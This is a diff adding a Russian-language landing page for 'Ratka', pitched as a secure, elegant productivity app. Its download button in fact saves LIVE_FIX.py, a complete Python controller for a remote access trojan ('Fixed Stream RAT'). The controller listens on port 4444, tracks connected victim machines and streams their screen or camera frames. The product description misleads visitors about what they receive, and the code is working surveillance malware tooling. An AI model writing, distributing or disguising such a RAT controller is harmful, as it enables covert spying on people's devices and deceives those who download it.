@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ratka - Современное решение</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0c1445, #2d1b33, #1a0f29);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+            text-shadow: 0 2px 15px rgba(0, 0, 0, 0.5);
+            background: linear-gradient(45deg, #ff6b6b, #ffa726, #6a11cb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            font-weight: 300;
+            background: linear-gradient(45deg, #a8edea, #fed6e3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .description {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            background: linear-gradient(45deg, #e0e0e0, #b0b0b0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .feature {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            width: 180px;
+            transition: transform 0.3s ease, background 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .feature:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.3));
+        }
+
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            background: linear-gradient(45deg, #ffd89b, #fcb69f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .feature-desc {
+            background: linear-gradient(45deg, #d4fc79, #96e6a1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 0.9rem;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #8B0000, #4B0082, #2F4F4F);
+            color: white;
+            padding: 18px 45px;
+            font-size: 1.3rem;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            cursor: pointer;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.8);
+            background: linear-gradient(45deg, #A52A2A, #5D3FD3, #36454F);
+        }
+
+        .download-btn:active {
+            transform: translateY(1px);
+        }
+
+        .download-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            transform: translateX(-100%);
+        }
+
+        .download-btn:hover::after {
+            transform: translateX(100%);
+            transition: transform 0.6s ease;
+        }
+
+        .version {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            background: linear-gradient(45deg, #a8edea, #fed6e3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            font-size: 0.9rem;
+            background: linear-gradient(45deg, #a8edea, #fed6e3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .subtitle {
+                font-size: 1.1rem;
+            }
+            
+            .feature {
+                width: 100%;
+                max-width: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="stars" id="stars"></div>
+    
+    <div class="container">
+        <h1>Ratka</h1>
+        <p class="subtitle">Современное решение для ваших задач</p>
+        
+        <p class="description">
+            Ratka - это инновационное приложение, которое поможет вам эффективно решать повседневные задачи. 
+            Простой интерфейс, мощные функции и высокая производительность делают Ratka идеальным выбором.
+        </p>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">🚀</div>
+                <div class="feature-title">Быстрота</div>
+                <div class="feature-desc">Молниеносная работа</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <div class="feature-title">Безопасность</div>
+                <div class="feature-desc">Ваши данные защищены</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎨</div>
+                <div class="feature-title">Дизайн</div>
+                <div class="feature-desc">Элегантный интерфейс</div>
+            </div>
+        </div>
+        
+        <button class="download-btn" id="downloadBtn">Скачать Ratka</button>
+        <div class="version">Текущая версия: 1.0</div>
+    </div>
+    
+    <footer>
+        <p>© 2025 Ratka. Все права защищены.</p>
+    </footer>
+
+    <script>
+        // Создание звездного фона
+        const starsContainer = document.getElementById('stars');
+        for (let i = 0; i < 150; i++) {
+            const star = document.createElement('div');
+            star.classList.add('star');
+            star.style.width = Math.random() * 3 + 'px';
+            star.style.height = star.style.width;
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 3 + 's';
+            starsContainer.appendChild(star);
+        }
+
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Анимация загрузки
+            const btn = this;
+            const originalText = btn.textContent;
+            btn.textContent = 'Загрузка...';
+            btn.style.pointerEvents = 'none';
+            
+            // Содержимое файла LIVE_FIX.py
+            const fileContent = `# ==================== ИСПРАВЛЕННЫЙ КОНТРОЛЛЕР СТРИМА ====================
+import tkinter as tk
+from tkinter import ttk, scrolledtext, messagebox
+import socket
+import threading
+import time
+import base64
+import zlib
+import io
+from PIL import Image, ImageTk
+import cv2
+import numpy as np
+
+class FixedStreamRATController:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("Fixed Stream RAT - Live Monitor")
+        self.root.geometry("1400x900")
+        
+        self.clients = {}
+        self.server_socket = None
+        self.is_running = False
+        self.current_client = None
+        self.streaming = False
+        self.stream_thread = None
+        self.stream_active = False
+        self.current_frame = None
+        self.frame_lock = threading.Lock()
+        
+        self.setup_ui()
+        
+    def setup_ui(self):
+        # Main layout
+        main_frame = tk.Frame(self.root)
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Left panel - Controls
+        left_panel = tk.Frame(main_frame, width=300)
+        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
+        left_panel.pack_propagate(False)
+        
+        # Server Controls
+        server_frame = tk.LabelFrame(left_panel, text="Server Controls", padx=10, pady=10)
+        server_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        tk.Button(server_frame, text="Start Server", command=self.start_server).pack(fill=tk.X, pady=2)
+        tk.Button(server_frame, text="Stop Server", command=self.stop_server).pack(fill=tk.X, pady=2)
+        
+        # Clients List
+        clients_frame = tk.LabelFrame(left_panel, text="Connected Clients", padx=10, pady=10)
+        clients_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        self.clients_tree = ttk.Treeview(clients_frame, columns=('IP', 'Status'), show='headings', height=10)
+        self.clients_tree.heading('IP', text='IP Address')
+        self.clients_tree.heading('Status', text='Status')
+        self.clients_tree.pack(fill=tk.BOTH, expand=True)
+        self.clients_tree.bind('<<TreeviewSelect>>', self.on_client_select)
+        
+        # Stream Controls
+        stream_frame = tk.LabelFrame(left_panel, text="Stream Controls", padx=10, pady=10)
+        stream_frame.pack(fill=tk.X)
+        
+        self.stream_btn = tk.Button(stream_frame, text="Start Stream", bg='red',
+                                   command=self.toggle_stream)
+        self.stream_btn.pack(fill=tk.X, pady=2)
+        
+        tk.Button(stream_frame, text="Force Stop Stream", command=self.force_stop_stream).pack(fill=tk.X, pady=2)
+        
+        # Quality settings
+        quality_frame = tk.Frame(stream_frame)
+        quality_frame.pack(fill=tk.X, pady=5)
+        
+        tk.Label(quality_frame, text="Quality:").pack(side=tk.LEFT)
+        self.quality_var = tk.StringVar(value="medium")
+        tk.Radiobutton(quality_frame, text="Low", variable=self.quality_var, value="low").pack(side=tk.LEFT)
+        tk.Radiobutton(quality_frame, text="Medium", variable=self.quality_var, value="medium").pack(side=tk.LEFT)
+        tk.Radiobutton(quality_frame, text="High", variable=self.quality_var, value="high").pack(side=tk.LEFT)
+        
+        # Right panel - Stream display
+        right_panel = tk.Frame(main_frame)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+        # Stream display
+        stream_display_frame = tk.LabelFrame(right_panel, text="Live Stream")
+        stream_display_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        self.stream_label = tk.Label(stream_display_frame, bg='black', 
+                                   text="Stream not active\\nSelect client and start stream")
+        self.stream_label.pack(fill=tk.BOTH, expand=True)
+        
+        # Stream info
+        info_frame = tk.Frame(stream_display_frame)
+        info_frame.pack(fill=tk.X, pady=5)
+        
+        self.stream_status = tk.Label(info_frame, text="Status: Stopped", fg='red')
+        self.stream_status.pack(side=tk.LEFT)
+        
+        self.fps_label = tk.Label(info_frame, text="FPS: 0")
+        self.fps_label.pack(side=tk.RIGHT)
+        
+        # Console
+        console_frame = tk.LabelFrame(right_panel, text="Console")
+        console_frame.pack(fill=tk.X)
+        
+        self.console = scrolledtext.ScrolledText(console_frame, height=8)
+        self.console.pack(fill=tk.BOTH, expand=True)
+        
+    def log(self, message):
+        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\\n")
+        self.console.see(tk.END)
+        
+    def start_server(self):
+        try:
+            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.server_socket.bind(('0.0.0.0', 4444))
+            self.server_socket.listen(5)
+            self.server_socket.settimeout(1)
+            
+            self.is_running = True
+            server_thread = threading.Thread(target=self.accept_connections, daemon=True)
+            server_thread.start()
+            
+            self.log("Server started on port 4444")
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to start server: {e}")
+            
+    def stop_server(self):
+        self.is_running = False
+        self.force_stop_stream()
+        if self.server_socket:
+            self.server_socket.close()
+        self.log("Server stopped")
+        
+    def accept_connections(self):
+        while self.is_running:
+            try:
+                client_socket, addr = self.server_socket.accept()
+                client_id = f"{addr[0]}:{addr[1]}"
+                
+                self.clients[client_id] = {
+                    'socket': client_socket,
+                    'address': addr,
+                    'status': 'Connected'
+                }
+                
+                self.update_clients_list()
+                self.log(f"New client: {client_id}")
+                
+            except socket.timeout:
+                continue
+            except:
+                break
+                
+    def update_clients_list(self):
+        for item in self.clients_tree.get_children():
+            self.clients_tree.delete(item)
+            
+        for client_id, client_data in self.clients.items():
+            self.clients_tree.insert('', tk.END, values=(
+                client_data['address'][0],
+                client_data['status']
+            ))
+            
+    def on_client_select(self, event):
+        selection = self.clients_tree.selection()
+        if selection:
+            item = selection[0]
+            client_ip = self.clients_tree.item(item)['values'][0]
+            
+            for client_id, client_data in self.clients.items():
+                if client_data['address'][0] == client_ip:
+                    self.current_client = client_data
+                    self.log(f"Selected: {client_id}")
+                    break
+                    
+    def toggle_stream(self):
+        if not self.streaming:
+            self.start_stream()
+        else:
+            self.stop_stream()
+            
+    def start_stream(self):
+        if not self.current_client:
+            messagebox.showwarning("Warning", "No client selected")
+            return
+            
+        self.streaming = True
+        self.stream_active = True
+        self.stream_btn.config(text="Stop Stream", bg='green')
+        self.stream_status.config(text="Status: Starting...", fg='orange')
+        
+        # Send start command
+        quality = self.quality_var.get()
+        self.send_command(f"start_stream {quality}")
+        
+        # Start stream thread
+        self.stream_thread = threading.Thread(target=self.stream_worker, daemon=True)
+        self.stream_thread.start()
+        
+        self.log("Stream started")
+        
+    def stop_stream(self):
+        self.stream_active = False
+        self.streaming = False
+        
+        if self.current_client:
+            self.send_command("stop_stream")
+            
+        self.stream_btn.config(text="Start Stream", bg='red')
+        self.stream_status.config(text="Status: Stopped", fg='red')
+        self.fps_label.config(text="FPS: 0")
+        self.stream_label.config(image='', text="Stream stopped")
+        
+        self.log("Stream stopped")
+        
+    def force_stop_stream(self):
+        """Принудительная остановка стрима"""
+        self.stream_active = False
+        self.streaming = False
+        
+        if self.current_client:
+            try:
+                self.current_client['socket'].send("force_stop".encode())
+            except:
+                pass
+                
+        self.stream_btn.config(text="Start Stream", bg='red')
+        self.stream_status.config(text="Status: Force Stopped", fg='red')
+        self.log("Stream force stopped")
+        
+    def stream_worker(self):
+        """Рабочий поток для получения кадров"""
+        frame_count = 0
+        start_time = time.time()
+        
+        while self.stream_active and self.current_client:
+            try:
+                # Устанавливаем таймаут для получения кадра
+                self.current_client['socket'].settimeout(2.0)
+                
+                # Запрашиваем кадр
+                self.current_client['socket'].send("get_frame".encode())
+                
+                # Получаем данные кадра
+                data = b""
+                start_receive = time.time()
+                
+                while self.stream_active and (time.time() - start_receive) < 5.0:
+                    try:
+                        chunk = self.current_client['socket'].recv(8192)
+                        if chunk:
+                            data += chunk
+                            if b"FRAME_END" in data:
+                                break
+                        else:
+                            break
+                    except socket.timeout:
+                        continue
+                    except:
+                        break
+                
+                if not self.stream_active:
+                    break
+                    
+                if b"FRAME:" in data and b"FRAME_END" in data:
+                    # Извлекаем данные кадра
+                    frame_data = data.split(b"FRAME:")[1].split(b"FRAME_END")[0]
+                    
+                    try:
+                        # Декодируем кадр
+                        compressed_data = base64.b64decode(frame_data)
+                        frame_bytes = zlib.decompress(compressed_data)
+                        
+                        # Конвертируем в изображение
+                        nparr = np.frombuffer(frame_bytes, np.uint8)
+                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                        
+                        if frame is not None:
+                            # Обновляем дисплей в основном потоке
+                            self.root.after(0, self.update_display, frame)
+                            frame_count += 1
+                            
+                            # Обновляем FPS каждую секунду
+                            current_time = time.time()
+                            if current_time - start_time >= 1.0:
+                                fps = frame_count / (current_time - start_time)
+                                self.fps_label.config(text=f"FPS: {fps:.1f}")
+                                frame_count = 0
+                                start_time = current_time
+                                
+                    except Exception as e:
+                        self.log(f"Frame error: {e}")
+                        
+            except socket.timeout:
+                continue
+            except Exception as e:
+                self.log(f"Stream worker error: {e}")
+                break
+                
+        # Очистка при выходе из потока
+        if self.streaming:
+            self.root.after(0, self.stop_stream)
+            
+    def update_display(self, frame):
+        """Обновление отображения кадра (вызывается в основном потоке)"""
+        try:
+            # Изменяем размер для отображения
+            h, w = frame.shape[:2]
+            max_size = 800
+            if w > max_size or h > max_size:
+                scale = max_size / max(w, h)
+                new_w, new_h = int(w * scale), int(h * scale)
+                frame = cv2.resize(frame, (new_w, new_h))
+            
+            # Конвертируем BGR в RGB
+            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            
+            # Создаем изображение для tkinter
+            image = Image.fromarray(frame_rgb)
+            photo = ImageTk.PhotoImage(image=image)
+            
+            # Обновляем метку
+            self.stream_label.config(image=photo, text="")
+            self.stream_label.image = photo
+            
+            self.stream_status.config(text=f"Status: Streaming ({w}x{h})", fg='green')
+            
+        except Exception as e:
+            self.log(f"Display error: {e}")
+            
+    def send_command(self, command):
+        """Отправка команды клиенту"""
+        if not self.current_client:
+            return
+            
+        try:
+            self.current_client['socket'].send(command.encode())
+            self.log(f"Sent: {command}")
+        except Exception as e:
+            self.log(f"Send error: {e}")
+            
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    controller = FixedStreamRATController()
+    controller.run()`;
+
+            // Создаем Blob с содержимым файла
+            const blob = new Blob([fileContent], { type: 'text/x-python-script' });
+            const url = URL.createObjectURL(blob);
+            
+            // Создаем временную ссылку для скачивания
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'LIVE_FIX.py';
+            document.body.appendChild(a);
+            a.click();
+            
+            // Очистка
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                btn.innerHTML = '✔ Скачано!';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.pointerEvents = 'auto';
+                }, 1500);
+            }, 100);
+            
+        });
+    </script>
+</body>
+</html>
